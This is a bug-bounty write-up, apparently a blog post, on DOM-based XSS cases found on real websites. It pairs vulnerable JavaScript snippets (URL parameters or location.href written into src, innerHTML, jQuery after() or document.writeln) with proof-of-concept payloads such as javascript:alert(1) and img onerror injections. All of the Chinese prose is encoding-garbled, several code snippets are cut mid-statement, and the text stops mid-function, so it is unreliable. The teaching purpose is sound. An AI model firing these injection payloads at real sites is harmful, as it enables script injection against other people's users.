å‰â¾”
åœ¨å‚ä¸BugBountyæ—¶ï¼Œæ’â¾æ¦œä¸­æœ‰â¼€äº›â¼ˆåˆ†æ•°å¾ˆâ¾¼ï¼Œé™¤äº†ä»–å¾ˆå‹¤å¥‹å¤–ï¼Œè¿˜æœ‰å¾ˆå¥½çš„â¾ƒåŠ¨åŒ–æ¥å‘ç°èµ„äº§ä¸­çš„æ¼æ´ï¼Œåƒh1è¿™
ç§èµâ¾¦å¹³å°ç«äº‰ä¹Ÿå¾ˆâ¼¤ï¼Œæ˜æ˜¾çš„æ¼æ´â¼ä¹å¾ˆå°‘ï¼Œè¦ä¸èµ„äº§ç‹¬ç‰¹ï¼Œè¦ä¸æ¼æ´ç‚¹å¾ˆéšè”½ï¼Œå¦åˆ™ä¸å®¹æ˜“å‘ç°,æˆ‘åœ¨â¼€å¼€å§‹æ¥è§¦
è¿™ä¸ªå¹³å°ï¼Œå› ä¸ºxssæœ€å¥½ä¸Šâ¼¿ï¼Œæ‰€ä»¥æˆ‘èŠ±äº†å¾ˆå¤šæ—¶é—´åœ¨è¿™ä¸Šâ¾¯ï¼Œä½†æ˜¯åå°„å‹xsså¾ˆå®¹æ˜“é‡å¤ï¼Œå› ä¸ºå…¶ä»–â¼ˆä¹Ÿå¾ˆå®¹æ˜“å‘ç°ï¼Œ
æˆ–è€…æ‰«åˆ°ï¼Œæ‰€ä»¥æœ€å¼€å§‹é‚£æ®µæ—¶é—´ï¼Œæˆ‘æŠŠâ½¬å…‰é›†ä¸­åœ¨Dom Xssä¸Šï¼Œå¹¶ä¸”åˆ¶ä½œäº†â¾ƒåŠ¨åŒ–æ¥å¸®åŠ©æˆ‘å‘ç°è¿™ç§ç±»å‹çš„æ¼æ´ï¼Œå°½ç®¡
å›½å†…å¹¶ä¸é‡è§†Xssï¼Œä½†æ˜¯å›½å¤–å¯¹äºXssçš„å¥–åŠ±è¿˜ç®—å¯è§‚ï¼Œæ‰€ä»¥å¯¹äºå­¦ä¹ è¿™ä¸ªæ¼æ´ç±»å‹æ¥è¯´å¾ˆæœ‰åŠ©â¼’ï¼Œå› ä¸ºæœ‰é’±èµš (^-^)ï¼Œ
â½½ä¸”è¿˜æœ‰â¼€äº›å¸ˆå‚…ä¸å«Œå¼ƒçš„å¸®åŠ©ï¼Œæˆ‘â¾®å¸¸æ„Ÿè°¢ï¼Œæ‰€ä»¥æˆ‘æƒ³åˆ†äº«â¼€äº›â¾ƒâ¼°åœ¨å‚ä¸BugBountyé‡åˆ°çš„Dom Xssï¼Œå¸Œæœ›å¯¹äºåˆ
å­¦è€…æœ‰å¸®åŠ©ã€‚
ï¼ˆæœ¬â½‚ä¸åŒ…å«ä»»ä½•å…³äºå¦‚ä½•æ‰«æDom Xssçš„å†…å®¹ã€‚ï¼‰ 
ï¼ˆå¾ˆå¤šæ¡ˆä¾‹å·²ä¿®å¤ï¼Œæ‰€ä»¥åªèƒ½ä»æ¼æ´æŠ¥å‘Šä¸­æ‰¾æ¼æ´ä»£ç ï¼Œæˆ–è€…é€šè¿‡Wayback Machineæ¥å¯»æ‰¾ä¹‹å‰çš„æºä»£ç ,ç»è¿‡â¼€ç‚¹ç‚¹åˆ 
æ”¹ã€‚ï¼‰ 
ï¼ˆæœ‰äº›æ¡ˆä¾‹Domå¾ˆå¤æ‚ä¹Ÿä¸å…¸å‹ï¼Œâ½‚ç« åªåˆ†äº«â¼€äº›ç»å…¸æ¡ˆä¾‹ï¼Œåœ¨æŒ–æ´æ—¶å¯èƒ½å¯ä»¥å‚è€ƒã€‚ï¼‰ 
ï¼ˆå°½ç®¡å›½å¤–å¯¹Xssçš„å¥–åŠ±å¯è§‚ï¼Œä½†Xssä¾ç„¶å±äºä¸­å±çº§åˆ«æ¼æ´ï¼Œâ½SSRF,RCE,Sqlæ³¨â¼Šè¿™äº›ï¼Œèµâ¾¦é€šå¸¸è¿˜æ˜¯å¾ˆä½ï¼Œæ‰€ä»¥æƒ³è¦åœ¨
BugBountyä¸­è·å¾—æ›´å¤šæ”¶â¼Šï¼Œè¿˜æ˜¯éœ€è¦å…³æ³¨ç ”ç©¶â¼€äº›â¾¼å±å®³ç±»å‹æ¼æ´ã€‚æœªæ¥å¯èƒ½ä¼šåˆ†äº«å…³äºå…¶ä»–ç±»å‹çš„ã€‚ï¼‰
æˆæœ
ä¸ºä»€ä¹ˆæŠŠæˆæœæ”¾åœ¨æœ€å‰â¾¯ï¼Œå› ä¸ºæˆ‘è¯´äº†èµšé’±æ˜¯åŠ©â¼’ï¼Œæˆ–è€…è¯´åŠ¨â¼’ï¼Œæˆ‘æ˜¯ä¿—â¼ˆï¼Œå°±æ˜¯ä¸ºäº†èµšé’±ï¼ŒğŸ¤£
æˆ‘æ”¶åˆ°å…³äºDom Xssçš„èµâ¾¦æ€»è®¡åœ¨ 30000$ å·¦å³ï¼Œæœ€â¼©çš„ 100$ ,æœ€â¼¤çš„ 3000$ ï¼Œâ¼¤æ¦‚70ä»½æŠ¥å‘Šï¼Œ90%çš„ç»“æœæ¥â¾ƒâ¾ƒåŠ¨åŒ–ï¼Œ
æ—¶é—´â¼¤æ¦‚æ˜¯2å¹´ï¼Œå› ä¸ºå‰æœŸåœ¨ä¼˜åŒ–æ”¹bugï¼Œæˆ‘æ²¡æœ‰24â¼©æ—¶å¤©å¤©æ‰«æï¼Œæˆ‘æ˜¯å¶å°”å¯¼â¼Šâ¼€äº›â½¬æ ‡æ¥æ‰«æï¼Œå› ä¸ºâ¼ˆå¤ªæ‡’äº†+ä¸‰â¼¼â¼†æ„
+è¿˜æœ‰å…¶ä»–äº‹æƒ…ï¼Œæ–­æ–­ç»­ç»­çš„ï¼Œéš”â¼€æ®µæ—¶é—´æâ¼€ä¼šã€‚â¾ƒåŠ¨åŒ–æ˜¯å¸®æˆ‘æ‰¾åˆ°å¯èƒ½çš„è„†å¼±ç‚¹ï¼Œç„¶åâ¼¿åŠ¨åˆ†æå¾ˆå¿«å°±å¯ä»¥å¾—åˆ°ç»“æœã€‚
æ¡ˆä¾‹
å…³äºDom xssï¼Œæˆ‘å¾ˆæ—©ä¹‹å‰è¿˜æœ‰â¼€ç¯‡â½‚ç« ï¼Œé‚£â¾¥ä¹Ÿå¯ä»¥è®©ä½ äº†è§£æ›´å¤šåŸºç¡€ã€‚ 
ä»¥ä¸‹æ‰€æœ‰æ¡ˆä¾‹æ¥â¾ƒçœŸå®â½¹ç«™ã€‚ 
é€šå¸¸å­¦ä¹ Dom Xss,æ‰¾åˆ°çš„â½‚ç« ä¼¼ä¹æ˜¯å¾ˆæ˜æ˜¾çš„Dom xssã€‚æˆ‘ä¹Ÿå‘ç°è¿‡ï¼Œä½†æ˜¯é‡åˆ°çš„â¼ç‡å¾ˆâ¼©ã€‚ 
ä¾‹å¦‚
var url = window.location.href; 
        var newUrl = 'DjamLanding.aspx'; 
        var splitString = url.split('?url='); 
        if (splitString.length > 1) { 
            newUrl = splitString[1]; 
            window.top.location.href = newUrl; 
        } 
        else { 
            // New Url With NO query string 
            alert('NO query string'); 
        } 
        window.top.location.href = newUrl; 
è¿™ç§å¾ˆç®€å•,ç›´æ¥åˆ†å‰² ?url= , ç„¶åæ¥è·³è½¬ 
Payload https://test.com/xss?url=javascript:alert(1)
æœ€å¸¸â»…çš„Case 1
æ¦‚æ‹¬ï¼šä»URLä¸­è·å–æŒ‡å®šå‚æ•°å€¼ï¼Œç„¶åå†™â¼Šé¡µâ¾¯ã€‚ 
è¿™ç§ç±»å‹é‡ç‚¹æ˜¯è·å–å‚æ•°çš„â½…å¼ 
1
    var getUrlParameter = function getUrlParameter(sParam) { 
        var sPageURL = window.location.search.substring(1), 
            sURLVariables = sPageURL.split('&'), 
            sParameterName, 
            i; 
        for (i = 0; i  
const posterElement = document.getElementById( 'poster-element' ) 
function getField( name ) { 
  let fname = document.getElementById( name ) 
  if( !fname ) fname = document.getElementById( 'data-' + name ) 
  let val 
  if( fname ) { 
    const isCheckbox = fname.matches( '[type="checkbox"]' ) 
    if( isCheckbox ) val = fname.checked 
    else val = fname.value || fname.content 
    // check for a hard true (from the checkbox) 
    if( val === true || (val && val.length > 0) ) return val 
    else { 
      val = getURLParameter( name ) 
      if( val && val.length > 0 ) { 
        if( isCheckbox ) fname.checked = !!val 
        else fname.value = val 
      } 
    } 
  } 
  return getURLParameter( name ) 
} 
 if( posterElement && !posterElement.src ) { 
    const posterSrc = getField( 'poster' ) || GLANCE.defaultPoster 
    if( posterSrc ) { 
      posterElement.src = posterSrc 
      posterElement.classList.remove( 'invisible' ) 
    } 
    else { 
      posterElement.classList.add( 'invisible' ) 
    } 
  } 
è·å–å‚æ•° poster å€¼è®¾ç½®ä¸º posterElement.src ï¼Œä¹Ÿå°±æ˜¯iframeæ ‡ç­¾srcçš„å€¼
Payload https://test.com/xss?poster=javascript:alert(1)
----- 3
function highlightSearchResults() { 
    const e = $(".content_block .content_container .content_block_text:last"); 
    layoutData.enableSearchHighlight && highlightSearchContent("highlight", e); 
    var t = getQueryParamByName("attachmentHighlight") || void 0; 
    t && $(".content_block_head").after("Please check the " + layoutData.attachments.toLowerCase() + " for matching keyword '" 
+ t + "' search result") 
} 
after() â½…æ³•åœ¨è¢«é€‰å…ƒç´ åæ’â¼ŠæŒ‡å®šçš„å†…å®¹ã€‚ 
è·å–å‚æ•° attachmentHighlight å€¼ç»™ t ,é€šè¿‡ jQuery after() å†™â¼Š
Payload https://test.com/xss?attachmentHighlight=%3Csvg%20onload=alert(1)%3E
----- 4 
è¿™ä¸ªæŠ¥å‘Šä¸­åªæœ‰è¿™å¼ å›¾â½š 
æµç¨‹æ˜¯ 
dev=params.get("dev")  > sessionStorage.setItem("braze-dev-version",dev)  > 
var version=sessionStorage.getItem("braze-dev-version")  > displayDevMessage(version)  > 
displayDevMessage(c) {var
a=document.createElement("div");a.innerHTML=c;document.body.appendChild(a);
Payload ?dev=%3Cimg%20src=x%20onerror=alert(1)%3E
ç”±äºå®ƒæ˜¯å‚¨å­˜åœ¨ sessionStorage ï¼Œç„¶åå†è¯»å–ï¼Œæ‰€ä»¥è¿™å¯ä»¥ç®—æ˜¯ä¸ªæŒä¹…Xssï¼Œè®¿é—®pocåï¼Œè®¿é—®ä»»ä½•åŠ è½½æ­¤jsçš„é¡µâ¾¯ä¾ç„¶
ä¼šè§¦å‘Xss
----- 5
let ghSource = getUrlParameter('gh_src'); 
for (var something in sorted) { 
    console.log(something); 
    // let options = 'All Categories' + something; 
    var sortedReplaced = replaceAll(something.replace(/\s/g, ''), '&', ''); 
    menuHtml.innerHTML += `${somethin
g}`; 
    // html += `No data` 
    html += `       ` 
    let categ = array[something]; 
    html += `` 
    let jobs = categ; 
    for (let j = 0; j  ${jobse.title}${locatio
n} 
                                            ` 
    } 
    html += `` 
    dataEl.innerHTML = html 
} 
è·å–å‚æ•° gh_src é€šè¿‡ replaceAll ä¼ ç»™ url , url å†™â¼Šaæ ‡ç­¾ï¼Œä½†æ˜¯è·å–å‚æ•°è§£ç äº†ï¼Œæ‰€ä»¥è¿˜æ˜¯ä¼šé€ æˆXss.
Payload https://test.com/xss?gh_src=xsstest%22%3E%3Cimg%20src%3dx%20onerror%3dalert(1)%3E
å¸¸â»…çš„Case 2
æ¦‚æ‹¬ï¼šç›´æ¥æŠŠlocation.hrefå†™â¼Šé¡µâ¾¯ 
æ­¤åœºæ™¯è¿˜æ˜¯å¾ˆå¸¸è§çš„
å¦‚æœä½ æŠŠ https://www.google.com/xsspath'"?xssparam'"=xssvalue'"#xsshash'" æ”¾â¼Šæµè§ˆå™¨URLæ  
ä½ ä¼šå¾—åˆ° https://www.google.com/xsspath'%22?xssparam%27%22=xssvalue%27%22#xsshash'%22
ä»å¾—åˆ°çš„ç»“æœæ¥çœ‹ï¼Œæµè§ˆå™¨ä¼¼ä¹åªå¯¹ location.search ä¹Ÿå°±æ˜¯å‚æ•°ä¸­çš„å•å¼•å·â¾ƒåŠ¨ç¼–ç  
path å’Œ hash  éƒ½ä¸ä¼šç¼–ç ï¼Œæ‰€ä»¥å¯ä»¥åˆ©â½¤hashé€ƒå‡ºä»»ä½•é€šè¿‡å•å¼•å·å¼•â½¤å¹¶å†™â¼Š location.href æˆ–è€… location.hash
çš„åœ°â½… 
å› ä¸ºä¿®æ”¹ path â¼€èˆ¬ä¼šå¯¼è‡´é¡µâ¾¯404ï¼Œæå°‘æ•°æƒ…å†µä¸‹æ‰èƒ½ä½¿â½¤ï¼Œä½†æ˜¯æœåŠ¡ç«¯ä»£ç åœ¨è·å–æŸä¸ª path å†™â¼Šé¡µâ¾¯çš„æ—¶å€™å¯èƒ½ä¼šé€ 
æˆåå°„å‹Xssã€‚
----- 1 
â½¹é¡µåˆ†äº«å¤„ï¼Œä»»ä½•åˆ†äº«ï¼Œâ½¹é¡µåˆ†æåˆ›å»ºçš„logè¯·æ±‚ å„ç§éœ€è¦å½“å‰é¡µâ¾¯urlçš„åœ°â½… 
åƒè¿™æ ·
   document.writeln("Twitter"); 
åªéœ€è¦é€šè¿‡ hash è·³å‡ºå•å¼•å·ï¼Œå°±å¯ä»¥æ·»åŠ jsäº‹ä»¶ï¼Œæ ¹æ®å…·ä½“æ ‡ç­¾å…·ä½“åˆ†æï¼Œè¿™â¾¥æ˜¯aæ ‡ç­¾æ‰€ä»¥å¾ˆå¤šéƒ½å¯ä»¥â½¤ï¼Œonclickä¸ºä¸¾ä¾‹
Payload https://test.com/xss#'onclick='alert(1)
----- 2 
â¼€äº›è¡¨å•æäº¤å¤„
            createInput: function(a) { 
                var b = "" 
                  , e = "" 
                  , c = a.fieldPrefix || ga 
                  , d = a.elementId || a.elementName 
                  , f = a.elementClasses && B(a.elementClasses) ? a.elementClasses : [] 
                  , g = "object" === typeof a.elementAttributes ? a.elementAttributes : 
{} 
                  , h = "button" === a.type || "submit" === a.type || "checkbox" === a.t
ype || "radio" === a.type || "hidden" === a.type 
                  , k = a.justElement || a.collection || "hidden" === a.type || "button" 
=== a.type || "submit" === a.type 
                  , l = "password" === a.type && !Bb && a.placeholder ? "text" : a.type 
                  , n = ("checkbox" === a.type && !a.collection || "radio" === a.type && 
!a.collection) && !a.justElement 
                  , m = a.rendererFieldName 
                  , p = a.rendererChildFieldName 
                  , t = Hc && !a.collection; 
                I(f, "capture_" + d) || f.push("capture_" + d); 